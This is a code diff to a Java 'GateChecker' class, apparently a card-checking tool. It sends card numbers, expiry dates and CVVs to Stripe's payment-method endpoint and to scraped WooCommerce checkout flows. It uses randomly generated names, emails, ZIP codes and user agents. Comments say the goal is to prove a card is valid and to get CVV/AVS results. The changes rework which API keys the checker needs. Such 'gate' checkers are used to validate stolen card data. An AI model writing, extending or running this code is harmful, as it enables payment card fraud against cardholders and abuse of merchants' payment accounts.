@@ -91,33 +91,40 @@ public class GateChecker {
         String acct = s.optString("connectedAccount", s.optString("stripeAccount", ""));
         String siteUrl = s.optString("siteUrl", "");
 
+        // Stripe server-side tokenization REQUIRES a secret key (sk_live_... or sk_test_...)
+        // Publishable keys (pk_...) can only be used from the browser via Stripe.js
+        if (sk.isEmpty()) {
+            if (!pk.isEmpty()) {
+                return error("Stripe requires a secret key (sk_live_...). Your gate has only a publishable key (pk_...). "
+                    + "Add sk_live_... in gate settings → Keys & Nonces → Stripe Secret Key");
+            }
+            return error("No Stripe keys configured. Add sk_live_... in gate settings → Keys & Nonces → Stripe Secret Key");
+        }
+
         // ── wc_stripe_confirm_setup_intent: simple PM creation ──
         if ("wc_stripe_confirm_setup_intent".equals(subType)) {
-            return stripeCreatePM(number, month, year, cvv, sk, pk, acct);
+            return stripeCreatePM(number, month, year, cvv, sk, acct);
         }
 
         // ── checkout_session: create session + confirm ──
-        if ("checkout_session".equals(subType) && !sk.isEmpty() && !siteUrl.isEmpty()) {
+        if ("checkout_session".equals(subType) && !siteUrl.isEmpty()) {
             return stripeCheckoutSession(number, month, year, cvv, sk, siteUrl);
         }
 
         // ── charges / payment_intents / auth / tokenize / standard / 3d_secure / stripe_page_confirm ──
-        // These all follow: tokenize → (optional) scrape WC for PI → confirm PI
-        if (sk.isEmpty() && pk.isEmpty()) return error("No Stripe keys — add sk_live_... or pk_live_...");
-
-        // If we have siteUrl and it's a WC flow, try WC scrape + PI confirm
-        if (!siteUrl.isEmpty() && !sk.isEmpty()) {
+        // Try WC scrape + PI confirm first (gives richer result with CVV/AVS checks)
+        if (!siteUrl.isEmpty()) {
             CheckResult wcResult = stripeWcFlow(number, month, year, cvv, sk, pk, acct, siteUrl, subType);
             if (wcResult != null) return wcResult;
         }
 
         // Fallback: just create PaymentMethod (proves card is valid)
-        return stripeCreatePM(number, month, year, cvv, sk, pk, acct);
+        return stripeCreatePM(number, month, year, cvv, sk, acct);
     }
 
-    // ── Stripe: Create PaymentMethod ──
+    // ── Stripe: Create PaymentMethod (requires secretKey) ──
     private static CheckResult stripeCreatePM(String number, String month, String year,
-                                              String cvv, String sk, String pk, String acct) throws Exception {
+                                              String cvv, String sk, String acct) throws Exception {
         String name = randomName();
         String email = name.toLowerCase().replace(" ", ".") + "@" + randomDomain();
         String zip = String.format("%05d", rand.nextInt(99999));
@@ -137,15 +144,8 @@ public class GateChecker {
         h.put("Content-Type", "application/x-www-form-urlencoded");
         h.put("Accept", "application/json");
         h.put("User-Agent", randomUA());
-
-        if (!sk.isEmpty()) {
-            h.put("Authorization", "Bearer " + sk);
-            if (!acct.isEmpty()) h.put("Stripe-Account", acct);
-        } else {
-            body.append("&key=").append(encode(pk));
-            h.put("Origin", "https://js.stripe.com");
-            h.put("Referer", "https://js.stripe.com/");
-        }
+        h.put("Authorization", "Bearer " + sk);
+        if (!acct.isEmpty()) h.put("Stripe-Account", acct);
 
         String resp = httpPost("https://api.stripe.com/v1/payment_methods", body.toString(), h);
         return classifyStripe(resp);
@@ -620,8 +620,7 @@ public class GateChecker {
         if (siteUrl.isEmpty()) return error("No Payeezy site URL configured");
 
         String sk = s.optString("secretKey", s.optString("stripeSecretKey",""));
-        String pk = s.optString("publicKey","");
-        if (!sk.isEmpty() || !pk.isEmpty()) return stripeCreatePM(number, month, year, cvv, sk, pk, "");
+        if (!sk.isEmpty()) return stripeCreatePM(number, month, year, cvv, sk, "");
 
         String addPm = s.optString("addPmPath", "/my-account/add-payment-method/");
         if (!addPm.startsWith("http")) addPm = siteUrl + addPm;
